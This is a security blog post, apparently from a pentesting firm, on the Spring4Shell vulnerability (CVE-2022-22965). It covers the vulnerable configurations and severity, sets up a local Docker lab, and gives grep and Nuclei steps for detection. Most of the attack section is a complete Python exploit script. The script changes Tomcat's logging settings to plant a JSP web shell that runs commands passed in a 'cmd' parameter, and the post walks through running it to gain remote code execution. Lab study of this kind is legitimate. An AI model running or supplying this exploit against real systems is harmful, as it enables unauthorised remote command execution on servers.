---
layout: post
title:  "Spring4Shell: Everything you need to know."
author: imran
categories: [ general,spring4shell ]
image: assets/images/15/0.png
---



A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

Spring WebFlux is a fully non-blocking, annotation-based web framework built on Project Reactor that makes it possible to build reactive applications on the HTTP layer. WebFlux uses a new router functions feature to apply functional programming to the web layer and bypass declarative controllers and RequestMappings.

To understand how to Build Web Api's or Web Applications in Spring [Read this article](https://howtodoinjava.com/spring-webflux/spring-webflux-tutorial/#:~:text=What%20is%20Spring%20WebFlux%20%3F,easily%20work%20on%20webflux%20also.)



## Prerequisites for the exploit:

If you’re using Tomcat and a vulnerable version of Spring, you pretty much have a problem, and should be patching now, Here are the pre-requirements for the current exploit to work on the target system:

- JDK 9 or higher
- Apache Tomcat as the Servlet container.
- Packaged as a traditional WAR (in contrast to a Spring Boot executable jar).
- spring-webmvc or spring-webflux dependency.
- Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions.
> However, its said that the nature of the vulnerability is more general, and there may be other ways to exploit it that have not been reported yet.


## Severity

The Severity is __CRITICAL__, Click the following [Link to CVSS-v3](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  to have a indepth look at how this vulnerability effects the CIA of the target system.


## Proof the Concept:

This exploit code was published by [@Rezn0k](https://twitter.com/Rezn0k), 

```python3
# Author: @Rezn0k
# Based off the work of p1n93r

import requests
import argparse
from urllib.parse import urlparse
import time

# Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

get_headers = {
    "prefix": "<%",
    "suffix": "%>//",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
}


def run_exploit(url, directory, filename):
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Changes take some time to populate on tomcat
    time.sleep(3)

    # Send the packet that writes the web shell
    ret = requests.get(url, headers=get_headers, verify=False)
    print("[*] Response Code: %d" % ret.status_code)

    time.sleep(1)

    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
                        required=False, default="webapps/ROOT")

    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url

    filename = file_arg.replace(".jsp", "")

    if url_arg is None:
        print("Must pass an option for --url")
        return

    try:
        run_exploit(url_arg, dir_arg, filename)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")

        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=id"
        print(f"[+] Shell should be at: {location}?cmd=id")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
```

### Running the Exploit

The amazing group of members at Lunasec developed a Java Web Application that is vulnerable to the Spring4Shell vulnerability (CVE-2022-22965), The Application is dockerized so that it can be easily implemented, The Application was built based on the tutorials provided on the official Documentation of Spring for [Form Handling](https://spring.io/guides/gs/handling-form-submission/).

Github Link: https://github.com/lunasec-io/Spring4Shell-POC


__How to Setup the Lab:__

- Clone the repository by typing `git clone https://github.com/lunasec-io/Spring4Shell-POC.git` in the terminal.
- cd to the cloned reporsitory and Build and run the container: `docker build . -t spring4shell && docker run -p 8080:8080 spring4shell`
- The Vulnerable Application will now be available at http://localhost:8080/helloworld/greeting

![1](/assets/images/15/1.png)


- Now the Copy the exploit code mentioned above and save it as `exploit.py`
- Now go to your terminal and execute the Exploit on Vulnerable url `python3 exploit.py --url http://localhost:8080/helloworld/greeting`

![1](/assets/images/15/2.png)


- On visiting the shell URL which is (http://localhost:8080/shell.jsp?cmd=id
) in my case, and passing any command in `cmd=` argument, You can see you have successfully Achived RCE on the App-Docker-Container.

![1](/assets/images/15/3.png)



## Is your Application Build Upon Spring Framework?

This quick grep search can help you identify if your application is built upon the spring framework, This is not the proper way to make sure you are completely safe against the vulnerability but will help you to have a starting point to get started in investigating this issue.

- [Unzip the war package](https://snapsec.co/blog/Spring4Shell-Everything-you-need-to-know/) using the zip coammnd in linux.

- Now go to the decompressed Directory and execute the following command to find any file which matches the `spring-beans-*.jar` pattern. If the grep returns any results it indicates that the business system is developed using the Spring framework.

![1](/assets/images/15/4.png)




## Scanning Your Networks

Recently one of the security researchers has built a Nuclei Template to Detect Spring4Shell, This template can be easily run to scan for Spring4Shell on your Networking, routing, or security devices inside your network.

Template Link: [https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-22965.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-22965.yaml)

__How to run a Scan:__

- Download the template in the current dir
- Save all your target IP's or Web Addresses in `urls.txt`
- run `nuclei -list urls.txt -t CVE-2022-22965.yaml`


## About us

Snapsec is a team of security experts specialized in providing pentesting and other security services to secure your online assets. We have a specialized testing methodology that ensures in-depth testing of your business logic and other latest vulnerabilities. 

 If you are looking for a team that values your security and ensures that you are fully secure against online security threats, feel free to get in touch with us #[support@snapsec.co](mailto:support@snapsec.co)



## Refrences:

- [https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [https://tanzu.vmware.com/security/cve-2022-22965](https://tanzu.vmware.com/security/cve-2022-22965)
- [https://github.com/lunasec-io/Spring4Shell-POC](https://github.com/lunasec-io/Spring4Shell-POC)
